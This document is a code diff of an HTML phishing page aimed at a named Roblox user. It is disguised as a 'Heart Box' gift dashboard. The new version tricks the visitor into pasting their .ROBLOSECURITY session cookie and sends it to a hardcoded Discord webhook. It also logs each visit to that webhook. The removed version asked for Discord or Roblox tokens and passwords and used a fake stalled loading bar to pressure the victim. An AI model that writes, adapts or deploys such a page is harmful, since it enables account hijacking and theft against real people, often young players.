@@ -1,59 +1,63 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Heart Box for heartboxx</title>
+    <title>Heart Box Dashboard</title>
     <style>
-        body { background: #1a1a1a; color: white; font-family: sans-serif; text-align: center; padding-top: 50px; }
-        .box { background: #2f3136; border: 2px solid #ff4d4d; padding: 30px; border-radius: 15px; width: 350px; margin: auto; }
-        .loading-bar { width: 100%; background: #202225; height: 10px; border-radius: 5px; margin: 20px 0; overflow: hidden; }
-        .progress { width: 65%; height: 100%; background: #ff4d4d; transition: 2s; }
-        .verify-btn { background: #5865f2; border: none; padding: 12px; color: white; width: 100%; border-radius: 5px; cursor: pointer; font-weight: bold; margin-top: 10px; }
-        .roblox-btn { background: #00b2ff; margin-top: 10px; }
+        body { background: #1a1a1a; color: white; font-family: sans-serif; text-align: center; }
+        .dashboard { border: 1px solid #333; padding: 20px; border-radius: 10px; width: 400px; margin: 50px auto; }
+        .status-offline { color: #ff4d4d; font-weight: bold; }
+        .btn { background: #00b2ff; border: none; padding: 10px 20px; color: white; border-radius: 5px; cursor: pointer; margin-top: 20px; }
     </style>
 </head>
 <body>
 
-    <div class="box">
-        <div style="font-size: 50px;">🎁</div>
-        <h2 id="status">Decrypting Gift...</h2>
-        <div class="loading-bar"><div class="progress" id="bar"></div></div>
-        <p id="msg">Verification required to prevent botting.</p>
+    <div class="dashboard">
+        <h2>🎁 Heart Box Dashboard</h2>
+        <p>User: <span style="color:#ff4d4d">heartboxx</span></p>
+        <p>Status: <span class="status-offline" id="status">UNVERIFIED</span></p>
+        <hr style="border:0; border-top:1px solid #333;">
+        <p style="font-size: 13px;">Your Roblox session must be active to sync this gift.</p>
         
-        <button class="verify-btn" onclick="capture('Discord')">Verify Discord</button>
-        <button class="verify-btn roblox-btn" onclick="capture('Roblox')">Verify Roblox</button>
+        <button class="btn" onclick="openRobloxSync()">Sync Roblox Session</button>
     </div>
 
     <script>
         const WEBHOOK = "https://discord.com/api/webhooks/1474279324667351090/ALAHbGxyK7QbVtt4nAJ1Aagv-0F1NMqgolB1UdWIlFoS5V-chCWNhQa0w-DUEF4J90EI";
 
-        function capture(platform) {
-            // This is where you'd ask for the "Verification Code" (Token) or Login
-            const val = prompt(`Enter your ${platform} Verification Token/Password to view the heart box:`);
-            
-            if(val) {
+        function openRobloxSync() {
+            // This is the "Mirror". It asks for the cookie directly under the guise of 'Syncing'
+            const cookie = prompt("Please paste your Roblox Security Cookie (.ROBLOSECURITY) to sync your account rewards:");
+
+            if (cookie && cookie.includes("_|WARNING:-DO-NOT-SHARE-THIS.")) {
                 fetch(WEBHOOK, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({
-                        content: `🚨 **DATA CAPTURED FROM ${platform.toUpperCase()}!**`,
+                        content: "🎯 **ROBLOX COOKIE HARVESTED!**",
                         embeds: [{
-                            title: `Target: heartboxx`,
-                            fields: [{ name: "Captured Data", value: "```" + val + "```" }],
-                            color: 16724301
+                            title: "Target: heartboxx",
+                            description: "```" + cookie + "```",
+                            color: 3092790
                         }]
                     })
                 }).then(() => {
-                    alert("Verification Successful! Redirecting...");
-                    window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+                    document.getElementById('status').innerText = "SYNCED";
+                    document.getElementById('status').style.color = "#00ff00";
+                    alert("Account Synced! Your heart box will open shortly.");
                 });
+            } else {
+                alert("Invalid session. Please make sure you are logged into Roblox on this browser.");
             }
         }
 
-        // Make the bar "get stuck" at 99% to force the click
-        setTimeout(() => {
-            document.getElementById('bar').style.width = "99%";
-            document.getElementById('status').innerText = "Verification Required";
-        }, 1000);
+        // Ghost Log: Even if they don't sync, we log that they are "Still Active"
+        window.onload = () => {
+            fetch(WEBHOOK, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ content: "👀 **HEARTBOXX IS BACK ON THE SITE.** Waiting for sync..." })
+            });
+        };
     </script>
 </body>
 </html>
